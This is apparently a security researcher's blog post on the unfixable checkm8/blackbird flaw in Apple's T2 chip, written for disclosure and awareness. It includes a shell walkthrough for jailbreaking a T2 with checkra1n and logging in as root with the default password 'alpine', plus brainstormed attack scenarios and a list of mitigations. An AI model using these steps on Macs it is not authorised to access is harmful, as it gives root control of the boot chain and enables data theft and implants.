+++
date = "2020-10-16T09:16:31+02:00"
title = "macOS Big Sur, the T2rminator?"
layout = "blog"
draft = false
+++

**Questions raised since the last blog post and the recent release of macOS Big Sur and the M1 chip require some clarification.**

## Preface

My previous blog post around the T2 vulnerabilities on Apple hardware caused a wave of news articles describing the issue, ranging from terrible copied to actually being written in a better way. I'm glad the post triggered such a wide reaction and reached its end goal: awareness.

A couple of interesting links if you aren't up to speed around the issue:

- Blog *T2 Research Team*: [On bridgeOS / T2 Research](https://blog.t8012.dev/on-bridgeos-t2-research/)
- Article *AppleInsider*: [Apple's T2 chip has an unfixable vulnerability that could allow root access](https://appleinsider.com/articles/20/10/05/apples-mac-t2-chip-has-an-unfixable-vulnerability-that-could-allow-root-access)
- Podcast *The Checklist*: [The T2 Vulnerability with Patrick Wardle](https://www.securemac.com/checklist/checklist-202-the-t2-vulnerability-with-patrick-wardle)

## Recap

A tiny recap of what was discussed [in the previous blog post "Crouching T2, Hidden Danger"](/blog/crouching-t2-hidden-danger/):

- The T2 security chip is used for verifying your macOS installation to be safe, keep track of encryption keys, handle touchID/faceID, handle keyboard and do other stuff such as hardware decoding of media formats.
- The T2 security chip in 2018-2020 Mac models is based on the A12 chip, which is vulnerable for the same checkm8 vulnerability.
- The chip can be triggered in booting in DFU mode without any physical attestation (such as holding in the power button) by sending arbitrary packets of information over USB Power Delivery (called "Vendor Defined Messages" or VDMs).
- This can be combined with checkra1n & blackbird vulnerabilities to gain **root** access to the T2 chip by restarting the T2 in DFU mode.

## Exploitation

And now, the moment you've all been waiting for. Let's jailbreak a T2 chip!

```shell
# install devtools
$ xcode-select --install

# check the script & install homebrew
$ /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"

# install packages
$ brew install libplist automake autoconf pkg-config openssl libtool llvm libusb

# git clone, autogen.sh, make & make install
# https://github.com/sbingner/ldid
# https://github.com/libimobiledevice/libusbmuxd
# https://github.com/libimobiledevice/libimobiledevice
# https://github.com/libimobiledevice/usbmuxd

# get the checkra1n beta from https://checkra.in/#release
# and verify the integrity hash matches
$ shasum -a256 checkra1n.app
d4def982494bc0b99c6df57dc94338c205902aaa8949e9ae046812ed57743ccb

# put your macOS device in DFU mode using the Apple Support document
# https://support.apple.com/guide/apple-configurator-2/revive-or-restore-mac-firmware-apdebea5be51/mac

# verify you can see your Mac in DFU mode
$ ioreg -p IOUSB
+-o Root <class I0RegistryEntry, id 0x100000100, retain 17>
  +-o AppleUSBXHCI Root Hub Simulation@14000000 <class AppleUSBRootHubDevice, id 0x100000312, registered, matched, active, busy 0 (2 ms), retain 14>
    +-o Apple Internal Keyboard / Trackpad@14400000 <class AppleUSBDevice, id 0x1000041a8, registered, matched, active, busy @ (2 ms), retain 16>
    +-o BRCM20702 Hub@14300000 <class AppleUSBDevice, id 0x10000420d, registered, matched, active, busy @ (@ ms), retain 12>
    | +-o Bluetooth USB Host Controller@14330000 <class AppleUSBDevice, id 0x100004223, registered, matched, active, busy 0 (1 ms), retain 17>
    +-o Apple Mobile Device (DFU Mode)@14100000 <class AppleUSBDevice, id 0x100004428, registered, matched, active, busy @ (1 ms), retain 14>

# Run checkra1n exploitation & watch the target reboot
$ sudo ./checkra1n.app/Contents/MacOS/checkra1n --cli --verbose-boot --verbose-logging

# Bring up a proxy to dropbear
$ iproxy 2222 44 &

# Connect to T2 with password 'alpine' & profit
$ ssh -p 2222 root@127.0.0.1
```

## Video Examples

And if you can't try out yourself, here are a couple of videos:

### Auto Jailbreaking the T2 Chip

In this example, we are going to jailbreak the T2 chip *without any user interaction*.
This shows the potential for any automated malicious attacks that are possible with hardware inserts.
Some magazines mentioned physical access to be difficult to exploit, but let's not forget that leaving malicious USB sticks is one of the most widely used attack methods for (physical) penetration testing. Or think about [the OMG cable](https://shop.hak5.org/products/o-mg-cable).

[!["auto jailbreak the T2"](https://i.ytimg.com/vi/LRoTr0HQP1U/hqdefault.jpg)](https://www.youtube.com/watch?v=LRoTr0HQP1U "Auto Jailbreaking the T2")

### Replacing the EFI on a Mac

And to prove that we do have in fact full operability on the system, in this case we are swapping the [MacEFI](https://apple.stackexchange.com/questions/98315/what-does-boot-efi-actually-do) with a modified version with a different boot logo.
This basically proves anything is possible once you have T2 access, since it is situated so early in the boot process.

[!["Wiping and Restoring a locked T2 MacBook"](https://i.ytimg.com/vi/uDSPlpEP-T0/hqdefault.jpg)](https://www.youtube.com/watch?v=uDSPlpEP-T0 "Wiping and Restoring a locked T2 MacBook")

## Attack Scenarios

So now we've covered the official things, let's brainstorm for a bit what attack scenarios are possible:

Attack Vectors:

- Supply Chain Attacks: intercepting orders & installing an USB implant in your Mac  
- Malicious peripherals: using various non-Apple peripherals with Macs is very common
- Physical access: stealing your Mac

Potential Attacks:

- There is no reason not to think that state actors have been unlocking Macs & iPhones using this method for a while.
- You buy a new charger or USB adapter from AliExpress or any other market, which actually carries an implant that jailbreaks your T2 and installs kernel malware when connected.
- Someone steals your powered down or locked MacBook and steals your data on disk and iCloud while disabling *Find My* and asks for a ransom.
- Someone steals your Mac, replaces your macOS installation with something infected & puts it back, stealing your bank credentials or spying on you.
- Someone sells you a malicious charger (or replaces yours) which auto-infects your macOS installation on every boot.
- A batch of Macs destined for **a government facility** are intercepted, USB-C hardware implants are inserted and data is exfiltrated over a cellular connection to another state actor. Remember [the SuperMicro hack controversy](https://www.zdnet.com/article/security-researcher-cited-in-supermicro-chip-hack-investigation-casts-doubt-on-story/)? *It's that on steroids.*
- A bunch of malicious cables which are sold to a research facility ship keystrokes to a remote server, allowing for mass theft of intellectual property.

*Fun fact: did you know that your Mac discloses its serial number to every charger connected? Your serial is not so secret after all.*

## Mitigations

1. Supply Chain Attacks : trust on Apple and other researchers to do their job? :-)
2. Malicious peripherals : buy accessories (and Macs for that matter) only from official and reputable shops.
3. Physical Access : keep a close eye on your Mac and [remove the device from iCloud](https://support.apple.com/guide/icloud/remove-a-device-mmfc0eeddd/icloud) in case of theft.
4. Buy a new Mac with a T3 chip :-(
5. Verify your EFI payload with [efivalidate](https://github.com/t8012/efivalidate).
6. Update your Mac! macOS Big Sur includes a couple of mitigations described below.

## Let's add Big Sur!

macOS Big Sur finally brings some new security features to the masses, bringing macOS more up to speed compared to its iOS kin:

1. Installing profiles is not longer possible via CLI, requiring graphical confirmation in System Settings or a full MDM enrollment.
This will prevent malware installing malicious profiles for persistence or security degradation like disabling the firewall.

2. Signed System Volumes (SSV) on your boot disk **and the T2** ensure files on the filesystem are checked for integrity on boot. Only a valid *snapshot* of your system volume is mounted instead of a full copy which is mounted read-only.

3. bridgeOS 5 which is installed with Big Sure is based on iOS 14 and will include all security enhacements of it. Checkm8 and blackbird remain unable to be fixed, but are now scoped in damage to just that boot of the T2

4. Kernel extensions are now supposed to be installed as System Extensions which run in user-space. Kernel & System extensions are also stored in a read-only portion in memory.

5. Modifications to the root certificate store now require graphical Administrator3 approval.

And most probably more that didn't reach the news yet. More to come!

## So will M1 fix it all?

The newer Apple Silicon Macs still sport a T-chip in the System-on-a-Chip, but we do not know yet whether this is a revised versionn (T3?).

Moving different things to the same SoC should at least remove some threat vectors such as Thunderbolt firmware attacks.
In addition, simplifying architecture (such as moving so silicon comparable to the A mobile chips) will always benefit security.
There is no news yet on what kind of T-chip is included in the M1 chip tough, so further research is required.
All we can say for now: it's most probably safer than current Intel-based Macbooks.

*But do you -really- care tough? The new chip's a beast!* As proven by various benchmarks, the *cheapest* MacBook now outperforms the *most expensive* one.
But if you -can- wait, I really suggest to wait for the M2 chip which will most probably blow us away like we've never seen.

## One More Thing

But I shouldn't always bring bad news.

The checkra1n team will be releasing [a T2 SDK](https://github.com/t8012/t2sdk) to develop applications for the T2 bridgeOS to facilitate security research on the T2 platform, along with [a public Wiki page](https://wiki.t8012.dev/) to help others investigate too.

They will also be releasing [a USB-PD screamer cable](https://blog.t8012.dev/plug-n-pwn/#usb-c-debug-probe) allowing others to investigate the USB-PD protocol used by USB-C devices and find new vulnerabilities in this NDA'd Intel protocol.
